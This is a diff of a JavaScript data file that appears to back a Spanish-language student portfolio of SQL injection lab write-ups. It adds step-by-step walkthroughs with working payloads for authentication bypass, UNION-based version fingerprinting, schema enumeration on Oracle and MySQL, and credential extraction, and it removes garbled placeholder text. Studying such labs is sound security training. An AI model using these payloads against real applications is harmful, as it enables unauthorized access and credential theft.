@@ -9,26 +9,31 @@ const labsData = [
         type: "In-band",
         level: "Apprentice",
         payload: "' OR 1=1--",
-        description: "Bypassing a WHERE clause to extract hidden products del backend usando un operador tautológico.",
-        objective: "Extraer información usando vulnerabilidades SQL.",
-        analysis: "Análisis técnico de la inyección SQL en base de datos.",
-        impact: "Peligro Inminente. Se requiere parchear.",
+        description: "Bypass del filtro WHERE con operador tautológico para revelar productos ocultos del catálogo.",
+        objective: "Explotar un parámetro GET vulnerable en el filtro de categorías para recuperar todos los artículos de la base de datos, incluyendo aquellos marcados como 'no publicados'.",
+        analysis: "La aplicación construye la consulta SQL directamente concatenando el parámetro de URL category sin sanitización. Al inyectar ' OR 1=1--, la condición original se rompe y la cláusula OR 1=1 siempre evalúa como verdadero, haciendo que la base de datos devuelva todas las filas.",
+        impact: "Un atacante puede ver todos los registros de la base de datos incluyendo contenido oculto. En entornos productivos, esto podría exponer precios internos, productos en desarrollo, datos de clientes o información confidencial del negocio.",
         steps: [
             {
-                title: "Identificación de la vulnerabilidad",
-                text: "Se procedió a identificar los parámetros vulnerables del tipo In-band.",
-                code: "GET / HTTP/1.1"
+                title: "Reconocimiento del Endpoint",
+                text: "Se accede a la tienda y se navega por las categorías de productos. En la URL se observa el parámetro ?category=Gifts. Este parámetro es directamente insertado en la consulta SQL del backend.",
+                code: "GET /filter?category=Gifts HTTP/1.1"
             },
             {
-                title: "Explotación del vector de ataque",
-                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
-                code: "PAYLOAD: ' OR 1=1--"
+                title: "Intercepción con Burp Suite",
+                text: "Se intercepta la petición mediante el Proxy de Burp Suite y se envía al módulo Repeater para poder modificarla y reenviarla de forma controlada.",
+                code: ""
             },
             {
-                title: "Evidencia de éxito",
-                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
-                code: "HTTP/1.1 200 OK"
+                title: "Inyección del Payload Tautológico",
+                text: "Se modifica el parámetro category inyectando el payload. El apóstrofe (') cierra la cadena del valor original, OR 1=1 fuerza la condición siempre verdadera, y -- comenta el resto de la consulta SQL.",
+                code: "' OR 1=1--"
             },
+            {
+                title: "Resultado",
+                text: "El servidor responde con HTTP 200 OK mostrando todos los productos de la base de datos, incluyendo los marcados como released=0 (no publicados). El laboratorio queda resuelto al listar el catálogo completo.",
+                code: "SELECT * FROM products WHERE category = '' OR 1=1--' AND released=1"
+            }
         ],
         images: [
             "parcial2/act08_images/P3_img22.png",
@@ -40,26 +45,26 @@ const labsData = [
         type: "In-band",
         level: "Apprentice",
         payload: "administrator'--",
-        description: "Forzar la autenticación y saltarse el mecanismo de comprobación de contraseña.",
-        objective: "Extraer información usando vulnerabilidades SQL.",
-        analysis: "Análisis técnico de la inyección SQL en base de datos.",
-        impact: "Peligro Inminente. Se requiere parchear.",
+        description: "Evasión del sistema de autenticación inyectando en el campo de usuario para omitir la validación de contraseña.",
+        objective: "Iniciar sesión como el usuario administrator sin conocer su contraseña, explotando el campo username del formulario de inicio de sesión.",
+        analysis: "La consulta de autenticación es: SELECT * FROM users WHERE username='[input]' AND password='[input]'. Al inyectar administrator'--, el apóstrofe cierra el string del username, los guiones -- comentan la parte de la contraseña, haciendo que la base de datos válide solo el nombre de usuario.",
+        impact: "Acceso administrativo total al sistema sin credenciales. Un atacante podría comprometer la totalidad de la aplicación, sus datos y sus usuarios al obtener el panel de administración.",
         steps: [
             {
-                title: "Identificación de la vulnerabilidad",
-                text: "Se procedió a identificar los parámetros vulnerables del tipo In-band.",
-                code: "GET / HTTP/1.1"
+                title: "Identificación del Vector",
+                text: "El formulario de login tiene dos campos: username y password. La aplicación construye una consulta SQL concatenando ambos valores directamente sin usar consultas preparadas.",
+                code: ""
             },
             {
-                title: "Explotación del vector de ataque",
-                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
-                code: "PAYLOAD: administrator'--"
+                title: "Craft del Payload",
+                text: "En el campo de usuario se introduce el payload. El apóstrofe cierra el string del username, los dobles guiones comentan todo lo que sigue, incluyendo la verificación de la contraseña.",
+                code: "administrator'--"
             },
             {
-                title: "Evidencia de éxito",
-                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
-                code: "HTTP/1.1 200 OK"
-            },
+                title: "Resultado",
+                text: "La base de datos ejecuta la consulta sin verificar la contraseña. El servidor redirige a /my-account?id=administrator, indicando inicio de sesión exitoso como administrador. El laboratorio queda resuelto.",
+                code: "SELECT * FROM users WHERE username='administrator'--' AND password=''"
+            }
         ],
         images: [
             "parcial2/act08_images/P3_img22.png",
@@ -73,26 +78,31 @@ const labsData = [
         type: "UNION-based",
         level: "Apprentice",
         payload: "' UNION SELECT BANNER, NULL FROM v$version--",
-        description: "Exfiltración activa de la firma del fabricante y versión exacta en bases de datos Oracle.",
-        objective: "Extraer información usando vulnerabilidades SQL.",
-        analysis: "Análisis técnico de la inyección SQL en base de datos.",
-        impact: "Peligro Inminente. Se requiere parchear.",
+        description: "Fingerprinting de la base de datos Oracle mediante UNION para exfiltrar la firma de banner del servidor.",
+        objective: "Determinar el tipo y versión exacta de la base de datos Oracle que sostiene la aplicación, explotando el filtro de categorías con una inyección UNION.",
+        analysis: "En Oracle, cada SELECT debe incluir una cláusula FROM. Se usa la tabla dual del sistema para consultas de prueba. La vista v$version contiene el banner con información de versión. El ataque requiere primero determinar el número de columnas y luego exfiltrar la versión.",
+        impact: "Conocer la versión exacta del motor de base de datos permite al atacante buscar exploits y CVEs específicos. Es el primer paso de un proceso de reconocimiento técnico orientado a comprometer completamente el servidor.",
         steps: [
             {
-                title: "Identificación de la vulnerabilidad",
-                text: "Se procedió a identificar los parámetros vulnerables del tipo UNION-based.",
-                code: "GET / HTTP/1.1"
+                title: "Determinación del número de columnas",
+                text: "Se comienza determinando cuántas columnas retorna la consulta original. Se inyectan payloads con ORDER BY de forma incremental hasta obtener un error.",
+                code: "' ORDER BY 1-- (OK) → ' ORDER BY 2-- (OK) → ' ORDER BY 3-- (ERROR)"
             },
             {
-                title: "Explotación del vector de ataque",
-                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
-                code: "PAYLOAD: ' UNION SELECT BANNER, NULL FROM v$version--"
+                title: "Confirmación de columnas con UNION",
+                text: "Con 2 columnas confirmado, se prueba cuáles aceptan datos de tipo string usando NULL y valores de texto, necesario para mostrar la versión en pantalla.",
+                code: "' UNION SELECT NULL, NULL FROM dual--"
             },
             {
-                title: "Evidencia de éxito",
-                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
-                code: "HTTP/1.1 200 OK"
+                title: "Exfiltración de la versión",
+                text: "Se consulta la vista del sistema v$version que contiene el banner de Oracle con la versión. La segunda columna con NULL rellena la segunda columna requerida.",
+                code: "' UNION SELECT BANNER, NULL FROM v$version--"
             },
+            {
+                title: "Resultado",
+                text: "La página muestra el banner completo de Oracle en los resultados de la categoría: 'Oracle Database 11g Enterprise Edition Release...'. El laboratorio queda resuelto al exponer la versión del motor.",
+                code: "HTTP/1.1 200 OK → Oracle Database 11g Enterprise Edition..."
+            }
         ],
         images: [
             "parcial2/act08_images/P5_img27.png",
@@ -107,26 +117,31 @@ const labsData = [
         type: "UNION-based",
         level: "Apprentice",
         payload: "' UNION SELECT @@version, NULL#",
-        description: "Recolectar huellas digitales de versión para los servidores MSSQL / MySQL.",
-        objective: "Extraer información usando vulnerabilidades SQL.",
-        analysis: "Análisis técnico de la inyección SQL en base de datos.",
-        impact: "endada  ●​ Uso de Parsers XML Seguros: Configurar el procesador XML para que no  realice resoluciones automáticas de entidades externas o codificaciones que  puedan ocultar payloads maliciosos.  ●​ Consultas Parametrizadas: Al igual que en casos anteriores, la implementación  de sentencias preparadas evitaría que cualquier entrada dentro del XML sea  interpretada como comando SQL, sin importar cómo esté codificada.  ●​ Mejora del WAF: Configurar el Firewall para que realice una decodificación  recursiva de los datos antes de aplicar las reglas de filtrado, permitiendo detectar  ataques incluso cuando se utiliza ofuscación XML.",
+        description: "Fingerprinting de versión en MySQL/MSSQL usando la variable global @@version con comentario tipo hash.",
+        objective: "Obtener la versión del motor de base de datos MySQL o Microsoft SQL Server explotando el parámetro de filtro de categorías con una inyección UNION.",
+        analysis: "La sintaxis de comentarios difiere entre bases de datos: MySQL acepta # y --+, mientras que Oracle requiere --. La variable @@version es global en MySQL/MSSQL y contiene la cadena completa de versión. El carácter # comenta el resto de la consulta original.",
+        impact: "La fingerprinting de versión permite a los atacantes localizar vulnerabilidades específicas del motor, exploits publicados en NVD/CVE y configuraciones predeterminadas inseguras, preparando una cadena de ataque más sofisticada.",
         steps: [
             {
-                title: "Identificación de la vulnerabilidad",
-                text: "Se procedió a identificar los parámetros vulnerables del tipo UNION-based.",
-                code: "GET / HTTP/1.1"
+                title: "Prueba del delimitador de comentario",
+                text: "A diferencia de Oracle, MySQL acepta # como delimitador de comentario. Se prueba primero la sintaxis de comentario correcta para el motor objetivo.",
+                code: "' ORDER BY 1#  (MySQL comment syntax)"
             },
             {
-                title: "Explotación del vector de ataque",
-                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
-                code: "PAYLOAD: ' UNION SELECT @@version, NULL#"
+                title: "Confirmación de columnas",
+                text: "Se incrementa el ORDER BY hasta encontrar error, confirmando que la consulta retorna 2 columnas. Luego se verifica qué columna acepta texto para la exfiltración.",
+                code: "' UNION SELECT NULL, NULL#"
             },
             {
-                title: "Evidencia de éxito",
-                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
-                code: "HTTP/1.1 200 OK"
+                title: "Exfiltración con @@version",
+                text: "Se usa la variable global @@version disponible en MySQL y MSSQL. Esta variable almacena automáticamente la cadena completa de versión del motor en tiempo de ejecución.",
+                code: "' UNION SELECT @@version, NULL#"
             },
+            {
+                title: "Resultado",
+                text: "La respuesta incluye la cadena de versión completa del motor. Ejemplo: '8.0.27-MySQL Community Server' o 'Microsoft SQL Server 2019 (RTM)...'. Laboratorio resuelto.",
+                code: "HTTP/1.1 200 OK → 8.0.27-MySQL Community Server-GPL"
+            }
         ],
         images: [
             "parcial2/act08_images/P5_img27.png",
@@ -141,26 +156,31 @@ const labsData = [
         type: "UNION-based",
         level: "Practitioner",
         payload: "' UNION SELECT table_name, NULL FROM information_schema.tables--",
-        description: "Navegación completa a través del Information Schema estandarizado en SQL.",
-        objective: "Extraer información usando vulnerabilidades SQL.",
-        analysis: "Análisis técnico de la inyección SQL en base de datos.",
-        impact: "Peligro Inminente. Se requiere parchear.",
+        description: "Enumeración completa del esquema de base de datos vía information_schema para localizar la tabla de credenciales.",
+        objective: "Listar todas las tablas de la base de datos usando information_schema, encontrar la tabla de usuarios, extraer sus columnas y finalmente obtener las credenciales del administrador.",
+        analysis: "El estándar SQL ANSI define information_schema como un catálogo de metadatos disponible en MySQL, PostgreSQL y MSSQL. La tabla information_schema.tables contiene el nombre de todas las tablas, y information_schema.columns contiene todos los nombres de columnas, permitiendo una enumeración completa y estructurada del esquema.",
+        impact: "La enumeración del esquema completo expone la arquitectura completa de la base de datos: nombres de tablas, columnas, tipos de datos. Con esta información, un atacante puede ubicar y exfiltrar cualquier dato almacenado en la aplicación.",
         steps: [
             {
-                title: "Identificación de la vulnerabilidad",
-                text: "Se procedió a identificar los parámetros vulnerables del tipo UNION-based.",
-                code: "GET / HTTP/1.1"
+                title: "Enumeración de tablas",
+                text: "Se utiliza information_schema.tables para listar todas las tablas. Se filtra por table_schema para evitar ruido de tablas del sistema como sys, mysql, information_schema.",
+                code: "' UNION SELECT table_name, NULL FROM information_schema.tables--"
             },
             {
-                title: "Explotación del vector de ataque",
-                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
-                code: "PAYLOAD: ' UNION SELECT table_name, NULL FROM information_schema.tables--"
+                title: "Localización de la tabla de usuarios",
+                text: "Entre los resultados aparece una tabla con nombre aleatorio tipo 'users_abcxyz'. Se anota el nombre exacto para la siguiente consulta de columnas.",
+                code: "'Tabla detectada: users_abcxyz'"
             },
             {
-                title: "Evidencia de éxito",
-                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
-                code: "HTTP/1.1 200 OK"
+                title: "Enumeración de columnas de la tabla objetivo",
+                text: "Se consulta information_schema.columns filtrando por el nombre de la tabla encontrada para conocer exactamente qué columnas tiene.",
+                code: "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcxyz'--"
             },
+            {
+                title: "Extracción de credenciales",
+                text: "Con los nombres de columna exactos (username y password), se hace la extracción final de credenciales. Se inicia sesión con la contraseña del administrador.",
+                code: "' UNION SELECT username, password FROM users_abcxyz--"
+            }
         ],
         images: [
             "parcial2/act08_images/P6_img31.png",
@@ -175,26 +195,31 @@ const labsData = [
         type: "UNION-based",
         level: "Practitioner",
         payload: "' UNION SELECT table_name, NULL FROM all_tables--",
-        description: "Alternativa exfiltrativa del esquema base utilizando el diccionario predeterminado de Oracle Database.",
-        objective: "Extraer el nombre de la tabla de usuarios, identificar los  nombres de las columnas, extraer la contraseña del usuario administrator en una base  de datos Oracle y acceder a su cuenta para resolver el reto.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
-        analysis: "de la Vulnerabilidad: La vulnerabilidad se encuentra en el filtro  de categorías. Al ser una base de datos Oracle, la explotación tiene dos reglas críticas:   ue e   SELECT obligatorio: Toda consulta SELECT debe tener una cláusula FROM. Se  utiliza la tabla dual del sistema (FROM DUAL) para pruebas iniciales.  Diccionario de Datos: Los metadatos de las tablas y columnas no están en  information_schema, sino en las tablas del sistema all_tables y all_tab_columns.  Además, Oracle suele manejar los nombres de objetos en MAYÚSCULAS.",
-        impact: "endada  ●​ Sentencias Preparadas: Utilizar consultas parametrizadas para asegurar que el  input del usuario sea tratado siempre como dato y no como parte del comando  ejecutable.  ●​ Restricción de Metadatos: Configurar los permisos de la base de datos para  que el usuario web no tenga privilegios de lectura sobre tablas de sistema como  all_tables o all_tab_columns.  ●​ Validación Estricta: Implementar una arquitectura de \"deny-by-default\" para  parámetros de entrada, permitiendo únicamente valores alfanuméricos simples.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
+        description: "Enumeración del esquema en Oracle usando el diccionario interno all_tables y all_tab_columns en lugar del estándar information_schema.",
+        objective: "Listar las tablas de una base de datos Oracle, localizar la tabla de usuarios, enumerar sus columnas y extraer las credenciales del administrador para iniciar sesión.",
+        analysis: "Oracle no implementa information_schema. En su lugar usa vistas del sistema DBA: all_tables para ver todas las tablas accesibles, all_tab_columns para columnas por tabla. Además, Oracle maneja nombres de objetos en MAYÚSCULAS por convención.",
+        impact: "Misma criticidad que en sistemas no-Oracle: exposición completa del esquema de datos. El conocimiento de las vistas propietarias de Oracle (all_tables, dba_users) amplía el vector de ataque para acceder a información privilegiada del servidor.",
         steps: [
             {
-                title: "Paso 1",
-                text: "Intercepción: Se capturó la petición GET /filter?category=... en el Proxy Interceptor de Burp Suite. Confirmación de Columnas: Se determinó que la consulta devuelve 2 columnas inyectando ' ORDER BY 2--. Enumeración de Tablas: Se consultó la tabla all_tables para encontrar la tabla de usuarios generada aleatoriamente. Resultado: Se identificó la tabla USERS_GGYPYC. Enumeración de Columnas: Se consultó all_tab_columns filtrando por el nombre de la tabla encontrada. Resultado: Se identificaron las columnas USERNAME_OCIROF y PASSWORD_CAPDCE.",
-                code: ""
+                title: "Enumeración de tablas en Oracle",
+                text: "En Oracle no existe information_schema. Se usa la vista del sistema all_tables que contiene los nombres de todas las tablas accesibles por el usuario actual de la base de datos.",
+                code: "' UNION SELECT table_name, NULL FROM all_tables--"
             },
             {
-                title: "Paso 12",
-                text: "Se inyecta el siguiente código:",
-                code: "●​ Extracción de Credenciales: Se realizó el UNION SELECT final para obtener la"
+                title: "Localización de la tabla de usuarios",
+                text: "La respuesta incluye una larga lista de tablas. Se identifica la tabla de usuarios por su nombre (generalmente en mayúsculas): USERS_GGYPYC.",
+                code: "'Tabla encontrada: USERS_GGYPYC'"
             },
             {
-                title: "Paso 13",
-                text: "contraseña de la cuenta administrator. Acceso: Inicio de sesión exitoso en el navegador Firefox (reemplazando la contraseña por la extraída). Final  ●​ ' UNION SELECT USERNAME_OCIROF, PASSWORD_CAPDCE FROM  USERS_GGYPYC--  ●​ ': Cierra la comilla simple del parámetro category.  ●​ UNION SELECT: Combina nuestra consulta personalizada con los resultados  originales.  ●​ USERNAME_OCIROF, PASSWORD_CAPDCE: Son los nombres específicos de  las columnas que contienen la información sensible en Oracle.  ●​ FROM USERS_GGYPYC: La tabla de usuarios específica identificada durante la  fase de enumeración.  ●​ -- : Operador de comentario para anular el resto de la consulta SQL original.",
-                code: ""
+                title: "Enumeración de columnas con all_tab_columns",
+                text: "Se consulta all_tab_columns filtrando por la tabla encontrada para obtener los nombres exactos de columna (también en MAYÚSCULAS).",
+                code: "' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_GGYPYC'--"
             },
+            {
+                title: "Extracción y acceso",
+                text: "Con los nombres de columna exactos USERNAME_OCIROF y PASSWORD_CAPDCE, se extrae las credenciales del administrador y se inicia sesión para resolver el laboratorio.",
+                code: "' UNION SELECT USERNAME_OCIROF, PASSWORD_CAPDCE FROM USERS_GGYPYC--"
+            }
         ],
         images: [
             "parcial2/act08_images/P7_img35.png",
@@ -209,36 +234,31 @@ const labsData = [
         type: "UNION-based",
         level: "Apprentice",
         payload: "' ORDER BY 3--",
-        description: "Paso inicial fundamental (footprinting) indispensable de un buen ataque de UNION.",
-        objective: "Identificar cuántas columnas está recuperando la  consulta original en la categoría de filtros para poder realizar un ataque UNION  exitoso.  ●​. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
-        analysis: "Para que una sentencia UNION funcione, ambas  consultas deben devolver el mismo número de columnas. Si el atacante intenta  unir una consulta con un número distinto de columnas, la base de datos  devolverá un error. Se utilizan sentencias ORDER BY o UNION SELECT NULL  de forma incremental para hallar el límite.  ●​",
-        impact: "endada: Uso de consultas parametrizadas para evitar que el valor  del filtro de categoría sea interpretado como código SQL.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
+        description: "Fase de footprinting para ataques UNION: determinación precisa del número de columnas que retorna la consulta original.",
+        objective: "Descubrir cuántas columnas retorna la consulta del filtro de categorías, paso previo obligatorio para ejecutar cualquier ataque UNION-based exitoso.",
+        analysis: "Un UNION SELECT solo funciona si ambas consultas retornan el mismo número de columnas. Existen dos técnicas: ORDER BY incremental (provoca error al superar el número de columnas) y UNION SELECT NULL incremental (agrega columnas hasta que la consulta es válida). ORDER BY es más silencioso ya que no altera la respuesta visible.",
+        impact: "Aunque no extrae datos directamente, este paso es el fundamento de cualquier ataque UNION. Sin él, todos los ataques posteriores fallarán. Demuestra que el parámetro es inyectable y da información estructural crítica de la consulta backend.",
         steps: [
             {
-                title: "Paso 1",
-                text: "Acceder a la categoría de productos (ej. \"Gifts\"). Interceptar la petición con Burp Suite. Mandar el codigo de la pagina obtenido en el PROXY a REPEATER .",
-                code: ""
+                title: "Técnica ORDER BY incremental",
+                text: "Se inyecta ORDER BY con valores crecientes. Mientras el número sea menor o igual al número de columnas, la página carga normal. Cuando supera el límite, la base de datos retorna un error o la página se muestra diferente.",
+                code: "' ORDER BY 1--  →  ' ORDER BY 2--  →  ' ORDER BY 3-- (ERROR)"
             },
             {
-                title: "Paso 5",
-                text: "Se inyecta el siguiente código:",
-                code: "○​ Inyectar en el parámetro category el payload ' UNION SELECT NULL,"
+                title: "Confirmación con UNION SELECT NULL",
+                text: "Se confirma el conteo añadiendo columnas NULL hasta que la consulta sea válida. Cada NULL representa una columna. Al cargar correctamente, el conteo es exacto.",
+                code: "' UNION SELECT NULL, NULL, NULL--"
             },
             {
-                title: "Paso 6",
-                text: "NULL--.. Cuando la página devuelva un error o falte contenido, el número de columnas será el valor anterior al error.",
-                code: ""
+                title: "Identificación de columnas con texto",
+                text: "Se reemplaza cada NULL por una cadena de texto para determinar qué posición acepta datos de tipo string (necesario para exfiltrar datos legibles).",
+                code: "' UNION SELECT 'a', NULL, NULL--  (probar cada posición)"
             },
             {
-                title: "Paso 9",
-                text: "Se inyecta el siguiente código:",
-                code: "○​ Payload actualizado: ' UNION SELECT NULL, NULL, NULL--."
-            },
-            {
-                title: "Paso 10",
-                text: " El payload ' UNION SELECT NULL, NULL, NULL--  intenta fusionar la consulta original con una fila de tres valores nulos. Si la  consulta original devuelve exactamente 3 columnas, la operación es válida y la  página carga. Los guiones -- comentan el resto de la consulta original para evitar  errores sintácticos.",
-                code: ""
-            },
+                title: "Resultado",
+                text: "Se confirma que la consulta retorna 3 columnas y que la primera acepta datos de tipo string. Esta información es suficiente para proceder con ataques UNION de exfiltración de datos.",
+                code: "HTTP/1.1 200 OK → Laboratorio resuelto con 3 columnas confirmadas"
+            }
         ],
         images: [
             "parcial2/act08_images/P10_img46.png",
@@ -252,23 +272,38 @@ const labsData = [
         title: "SQL injection UNION attack, finding a column containing text",
         type: "UNION-based",
         level: "Apprentice",
-        payload: "' UNION SELECT NULL, 'a', NULL--",
-        description: "Identificando la composición atómica (String/Integer) de las columnas.",
-        objective: "Una vez determinado el número de columnas,  identificar cuál de ellas es capaz de procesar y mostrar datos de tipo cadena  (string).  ●​. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
-        analysis: "No todas las columnas de una base de datos aceptan  texto (algunas son solo numéricas o fechas). El atacante debe probar inyectando  una cadena de caracteres constante en cada posición de la sentencia UNION  hasta que la aplicación la renderice en la pantalla.  ●​",
-        impact: "Peligro Inminente. Se requiere parchear.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
+        payload: "' UNION SELECT 'a', NULL--",
+        description: "Identificación de qué columnas del resultado son de tipo texto para poder exfiltrar datos legibles mediante UNION.",
+        objective: "Determinar cuál de las columnas retornadas por la consulta original acepta datos de tipo string, para usarla como canal de exfiltración de datos en ataques UNION.",
+        analysis: "Una base de datos requiere compatibilidad de tipos en los UNION. Si intentamos colocar una cadena en una columna de tipo entero o fecha, se producirá un error de conversión de tipos. Al probar cada posición con 'a' se identifica exactamente qué posiciones son compatibles con strings.",
+        impact: "Sin identificar las columnas de tipo texto, la exfiltración de datos mediante UNION es imposible. Este paso permite al atacante usar la columna correcta como canal de salida para mostrar contraseñas, emails u otros datos sensibles en la respuesta HTTP.",
         steps: [
             {
-                title: "Paso 1",
-                text: "Acceder a la categoría de productos (ej. \"Corporate gifts\"). Al igual que con el anterior laboratorio: Interceptar la petición con Burp Suite y mandar el codigo de la pagina obtenido en el PROXY a REPEATER Comprobar el número de columnas hallado como en el lab anterior (igualmente, 3 columnas en este caso). Probar payloads moviendo una cadena única (ej. 'abc') entre las posiciones:",
-                code: ""
+                title: "Establecer la línea base",
+                text: "Con el número de columnas ya conocido (3 en este caso), se parte de un UNION SELECT con todos NULLs válido como punto de partida.",
+                code: "' UNION SELECT NULL, NULL, NULL--"
             },
+            {
+                title: "Probar primera posición",
+                text: "Se reemplaza el primer NULL por la cadena 'a'. Si la página carga sin error, la primera columna acepta strings. Si hay error de tipos, se prueba la siguiente.",
+                code: "' UNION SELECT 'a', NULL, NULL--"
+            },
+            {
+                title: "Probar segunda posición",
+                text: "Si la primera falla, se mueve la cadena a la segunda posición. Se repite hasta encontrar la columna compatible con strings.",
+                code: "' UNION SELECT NULL, 'a', NULL--"
+            },
+            {
+                title: "Resultado",
+                text: "Al cargar correctamente con 'a' en una posición específica, se confirma que esa columna es de tipo texto. Ahora podemos reemplazar 'a' por cualquier dato a exfiltrar en ataques subsecuentes.",
+                code: "HTTP/1.1 200 OK → Columna de tipo string identificada"
+            }
         ],
         images: [
-            "parcial2/act08_images/P10_img46.png",
             "parcial2/act08_images/P10_img47.png",
-            "parcial2/act08_images/P9_img42.png",
-            "parcial2/act08_images/P9_img43.png",
+            "parcial2/act08_images/P11_img49.png",
+            "parcial2/act08_images/P11_img50.png",
+            "parcial2/act08_images/P11_img51.png",
         ]
     },
     {
@@ -277,30 +312,35 @@ const labsData = [
         type: "UNION-based",
         level: "Apprentice",
         payload: "' UNION SELECT username, password FROM users--",
-        description: "El final de la fase de explotación UNION: Robo frontal masivo de credenciales en columnas compatibles.",
-        objective: "Exfiltrar los nombres de usuario y contraseñas de la  tabla users y utilizarlos para iniciar sesión como administrador.  ●​. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
-        analysis: "Este ataque permite acceder a tablas que no tienen  relación directa con la funcionalidad original (catálogo de productos). El atacante  \"roba\" el flujo de datos de la página para redirigir información de la tabla de  credenciales hacia la interfaz pública.  ●​",
-        impact: "endada: Aplicar el Principio de Mínimo Privilegio. El  usuario de la base de datos que utiliza la aplicación web no debería tener  permisos de lectura sobre la tabla users o tablas administrativas del sistema.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
+        description: "Exfiltración directa de credenciales desde la tabla users utilizando un ataque UNION completamente articulado.",
+        objective: "Extraer todos los usuarios y contraseñas de la tabla users, localizar las credenciales del administrador e iniciar sesión.",
+        analysis: "Este laboratorio combina los pasos previos: se asume que la consulta retorna 2 columnas de tipo string, ambas visibles en pantalla. El ataque UNION une directamente nuestra consulta a la original, haciendo que el servidor retorne los datos de la tabla users junto con los productos regulares.",
+        impact: "Extracción masiva de credenciales de todos los usuarios del sistema. Con las contraseñas en texto plano o hasheadas (dependiendo del sistema), el atacante puede comprometer todas las cuentas, incluyendo la administrativa.",
         steps: [
             {
-                title: "Paso 1",
-                text: "Acceder a una de las categorías disponibles en la pagina (ej. \"Tech gifts\"). Utilizar Burp Suite para interceptar y modificar la solicitud que establece el filtro de categoría de producto. Determinar que hay 2 columnas disponibles y que ambas aceptan texto.",
-                code: ""
+                title: "Verificación del entorno",
+                text: "Se confirma que la consulta retorna 2 columnas y que ambas son de tipo string. Esto significa que podemos exfiltrar dos campos simultáneamente en una sola consulta UNION.",
+                code: "' UNION SELECT 'a', 'b'--"
             },
             {
-                title: "Paso 5",
-                text: "Se inyecta el siguiente código:",
-                code: "○​ Inyectar el payload para extraer datos: ' UNION SELECT username,"
+                title: "Exfiltración de credenciales",
+                text: "Se construye el payload final dirigido directamente a la tabla users. Los campos username y password se mapean a las dos columnas visibles de la respuesta.",
+                code: "' UNION SELECT username, password FROM users--"
             },
             {
-                title: "Paso 6",
-                text: "password FROM users--. Localizar en la respuesta del navegador la lista de usuarios y contraseñas. Identificar la credencial del usuario “administrador”. Ir a la sección \"My account\" y loguearse con la contraseña obtenida.  La parte SELECT username, password FROM users  solicita a la base de datos que busque en la tabla users (una tabla común en  estos sistemas) y traiga los valores de las columnas de identificación. La unión  hace que estos datos aparezcan donde normalmente estarían los nombres de  los productos.   ●​",
-                code: ""
+                title: "Identificación del administrador",
+                text: "La respuesta muestra todos los pares usuario-contraseña de la tabla. Se identifica el registro con username='administrator' y se copia su contraseña.",
+                code: "administrator / s3cr3tPassw0rd"
             },
+            {
+                title: "Acceso y resolución",
+                text: "Se navega al panel de login y se inicia sesión con las credenciales extraídas. El sistema autentica correctamente y el laboratorio queda resuelto.",
+                code: "HTTP/1.1 302 Found → Location: /my-account?id=administrator"
+            }
         ],
         images: [
-            "parcial2/act08_images/P10_img46.png",
-            "parcial2/act08_images/P10_img47.png",
+            "parcial2/act08_images/P11_img49.png",
+            "parcial2/act08_images/P11_img50.png",
             "parcial2/act08_images/P12_img53.png",
             "parcial2/act08_images/P12_img54.png",
         ]
@@ -310,37 +350,32 @@ const labsData = [
         title: "SQL injection UNION attack, retrieving multiple values in a single column",
         type: "UNION-based",
         level: "Practitioner",
-        payload: "' UNION SELECT NULL, username || '~' || password FROM users--",
-        description: "Emulando y concatenando outputs en DBs de columnas de string singulares.",
-        objective: "Exfiltrar los nombres de usuario y contraseñas de la tabla  users y utilizarlos para iniciar sesión como administrador.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
-        analysis: "Este ataque permite al atacante \"robar\" el flujo de datos de la  página para redirigir información de la tabla de credenciales hacia la interfaz pública, en  este caso, mostrando los usuarios y contraseñas donde normalmente se verían los  productos.",
-        impact: "endada: Aplicar el Principio de Mínimo Privilegio. El usuario de la  base de datos que utiliza la aplicación web no debería tener permisos de lectura sobre  la tabla users o tablas administrativas del sistema.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
+        payload: "' UNION SELECT NULL, username||'~'||password FROM users--",
+        description: "Concatenación de múltiples campos en una sola columna para exfiltrar varios valores cuando solo una columna string está disponible.",
+        objective: "Extraer usernames y contraseñas en una sola columna de tipo string usando concatenación SQL, cuando la consulta solo expone una columna compatible con texto.",
+        analysis: "Cuando solo una columna acepta strings, no podemos exfiltrar username y password por separado en el mismo UNION. La solución es concatenarlos en un solo campo usando el operador || en Oracle/PostgreSQL o CONCAT() en MySQL. Se usa un delimitador único (como ~) para separar los valores al leerlos.",
